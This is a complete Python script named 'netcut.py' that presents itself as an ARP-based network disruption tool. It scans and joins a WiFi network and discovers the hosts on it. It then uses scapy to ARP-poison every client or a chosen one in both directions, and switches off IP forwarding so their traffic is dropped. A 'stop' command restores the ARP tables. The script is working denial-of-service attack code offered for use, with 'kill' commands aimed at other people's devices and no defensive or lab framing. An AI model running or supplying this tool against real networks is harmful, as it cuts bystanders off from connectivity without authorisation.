#!/usr/bin/env python3
"""
netcut.py - ARP-based network disruption tool
Joins a target WiFi network and ARP-poisons all clients,
causing them to lose connectivity.

Usage:
  netcut.py scan                        - Scan for WiFi networks
  netcut.py join <SSID> <password>      - Join target network on wlan1
  netcut.py discover                    - Discover hosts on the network
  netcut.py kill                        - Kill all discovered hosts
  netcut.py kill <target_ip>            - Kill specific host
  netcut.py stop                        - Stop poisoning, restore ARP tables
  netcut.py status                      - Show current state
"""

import sys
import os
import time
import signal
import subprocess
import json
from pathlib import Path

STATE_FILE = "/tmp/netcut_state.json"
IFACE = os.environ.get("NETCUT_IFACE", "wlan0")

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except subprocess.TimeoutExpired:
        return ""

def run_bg(cmd):
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {"targets": [], "gateway": "", "gateway_mac": "", "my_ip": "", "my_mac": "", "poisoning": False}

def save_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def get_mac(ip):
    """Get MAC address for an IP using arping"""
    out = run(f"arping -c 2 -I {IFACE} {ip} 2>/dev/null")
    for line in out.split("\n"):
        if "[" in line and "]" in line:
            mac = line.split("[")[1].split("]")[0]
            return mac.lower()
    out = run(f"arp -n | grep '{ip} '")
    if out:
        parts = out.split()
        if len(parts) >= 3:
            return parts[2].lower()
    return ""

def scan_wifi():
    print("[*] Scanning for WiFi networks...")
    out = run(f"iw dev {IFACE} scan 2>/dev/null | grep -E 'SSID:|signal:|BSS ' | head -60", timeout=15)
    if not out:
        run(f"ip link set {IFACE} up")
        time.sleep(1)
        out = run(f"iw dev {IFACE} scan 2>/dev/null | grep -E 'SSID:|signal:|BSS ' | head -60", timeout=15)
    if out:
        print(out)
    else:
        print("[-] No networks found or scan failed")

def join_network(ssid, password):
    print(f"[*] Joining '{ssid}' on {IFACE}...")

    conf = f'/tmp/wpa_{IFACE}.conf'
    with open(conf, 'w') as f:
        f.write(f'network={{\n    ssid="{ssid}"\n    psk="{password}"\n}}\n')

    run(f"killall wpa_supplicant 2>/dev/null")
    time.sleep(1)
    run(f"ip link set {IFACE} up")
    time.sleep(1)

    proc = run_bg(f"wpa_supplicant -i {IFACE} -c {conf} -B")
    time.sleep(3)

    out = run(f"wpa_cli -i {IFACE} status 2>/dev/null | grep wpa_state")
    if "COMPLETED" in out:
        print("[+] Associated!")
    else:
        print("[*] Waiting for association...")
        time.sleep(5)
        out = run(f"wpa_cli -i {IFACE} status 2>/dev/null | grep wpa_state")
        if "COMPLETED" not in out:
            print(f"[-] Association failed. State: {out}")
            return

    run(f"udhcpc -i {IFACE} -q -t 5 -n 2>/dev/null")
    time.sleep(2)

    my_ip = run(f"ip addr show {IFACE} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1")
    gateway = run(f"ip route | grep 'default.*{IFACE}' | awk '{{print $3}}'")

    if not my_ip:
        print("[-] No IP obtained via DHCP")
        return
    if not gateway:
        print(f"[-] Got IP {my_ip} but no default route on {IFACE}")
        return

    gateway_mac = get_mac(gateway)
    my_mac = run(f"cat /sys/class/net/{IFACE}/address")

    state = load_state()
    state["my_ip"] = my_ip
    state["my_mac"] = my_mac
    state["gateway"] = gateway
    state["gateway_mac"] = gateway_mac
    save_state(state)

    print(f"[+] Connected: IP={my_ip}, GW={gateway} ({gateway_mac})")

def discover_hosts():
    state = load_state()
    if not state["gateway"]:
        print("[-] Not connected to a network. Run 'join' first.")
        return

    gw = state["gateway"]
    subnet = ".".join(gw.split(".")[:3])
    my_ip = state["my_ip"]

    print(f"[*] Discovering hosts on {subnet}.0/24...")

    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        run_bg(f"arping -c 1 -w 1 -I {IFACE} {ip} 2>/dev/null")

    time.sleep(3)

    arp_table = run("arp -n")
    hosts = []
    for line in arp_table.split("\n"):
        parts = line.split()
        if len(parts) >= 3 and parts[2] != "00:00:00:00:00:00" and "incomplete" not in line:
            ip = parts[0]
            mac = parts[2]
            if ip != my_ip and ip.startswith(subnet):
                hosts.append({"ip": ip, "mac": mac})

    state["targets"] = hosts
    save_state(state)

    print(f"[+] Found {len(hosts)} hosts:")
    for h in hosts:
        label = " (GATEWAY)" if h["ip"] == state["gateway"] else ""
        print(f"    {h['ip']:16s}  {h['mac']}{label}")

def poison_target(target_ip, target_mac, gateway_ip, my_mac):
    """Send ARP reply telling target that we are the gateway"""
    try:
        from scapy.all import ARP, Ether, sendp
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwsrc=my_mac,
            hwdst=target_mac
        )
        sendp(pkt, iface=IFACE, verbose=False)
    except Exception as e:
        print(f"[-] Scapy send error: {e}")

def kill_hosts(specific_ip=None):
    state = load_state()
    if not state["gateway"]:
        print("[-] Not connected. Run 'join' first.")
        return
    if not state["targets"]:
        print("[-] No targets. Run 'discover' first.")
        return

    # Disable IP forwarding so traffic dies at us
    run("echo 0 > /proc/sys/net/ipv4/ip_forward")

    gateway = state["gateway"]
    gateway_mac = state["gateway_mac"]
    my_mac = state["my_mac"]

    targets = state["targets"]
    if specific_ip:
        targets = [t for t in targets if t["ip"] == specific_ip]
        if not targets:
            print(f"[-] Target {specific_ip} not found. Run 'discover'.")
            return

    # Filter out ourselves and the gateway from kill targets
    kill_targets = [t for t in targets if t["ip"] != state["my_ip"] and t["ip"] != gateway]

    if not kill_targets:
        print("[-] No valid targets to poison")
        return

    print(f"[*] Poisoning {len(kill_targets)} host(s)... (Ctrl+C to stop)")
    state["poisoning"] = True
    save_state(state)

    try:
        from scapy.all import ARP, Ether, sendp
        while True:
            for t in kill_targets:
                # Tell target: "I am the gateway"
                poison_target(t["ip"], t["mac"], gateway, my_mac)
                # Tell gateway: "I am the target" (cuts return path too)
                poison_target(gateway, gateway_mac, t["ip"], my_mac)
            sys.stdout.write(f"\r[*] Sent poison burst to {len(kill_targets)} targets")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        restore_arp(state)

def restore_arp(state=None):
    if state is None:
        state = load_state()

    gateway = state["gateway"]
    gateway_mac = state["gateway_mac"]

    if not gateway or not gateway_mac:
        print("[-] No state to restore")
        return

    print("[*] Restoring ARP tables...")
    try:
        from scapy.all import ARP, Ether, sendp
        for t in state.get("targets", []):
            if t["ip"] == state["my_ip"] or t["ip"] == gateway:
                continue
            # Tell target the real gateway MAC
            pkt = Ether(dst=t["mac"]) / ARP(
                op=2, psrc=gateway, pdst=t["ip"],
                hwsrc=gateway_mac, hwdst=t["mac"]
            )
            sendp(pkt, iface=IFACE, count=3, verbose=False)
            # Tell gateway the real target MAC
            pkt = Ether(dst=gateway_mac) / ARP(
                op=2, psrc=t["ip"], pdst=gateway,
                hwsrc=t["mac"], hwdst=gateway_mac
            )
            sendp(pkt, iface=IFACE, count=3, verbose=False)
    except Exception as e:
        print(f"[-] Restore error: {e}")

    state["poisoning"] = False
    save_state(state)
    print("[+] ARP tables restored")

def show_status():
    state = load_state()
    print("=" * 40)
    print("NetCut Status")
    print("=" * 40)
    print(f"  Interface:  {IFACE}")
    print(f"  My IP:      {state.get('my_ip', 'N/A')}")
    print(f"  My MAC:     {state.get('my_mac', 'N/A')}")
    print(f"  Gateway:    {state.get('gateway', 'N/A')}")
    print(f"  GW MAC:     {state.get('gateway_mac', 'N/A')}")
    print(f"  Targets:    {len(state.get('targets', []))}")
    print(f"  Poisoning:  {state.get('poisoning', False)}")
    print("=" * 40)

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return

    cmd = sys.argv[1]

    if cmd == "scan":
        scan_wifi()
    elif cmd == "join" and len(sys.argv) >= 4:
        join_network(sys.argv[2], sys.argv[3])
    elif cmd == "discover":
        discover_hosts()
    elif cmd == "kill":
        target = sys.argv[2] if len(sys.argv) > 2 else None
        kill_hosts(target)
    elif cmd == "stop":
        restore_arp()
    elif cmd == "status":
        show_status()
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
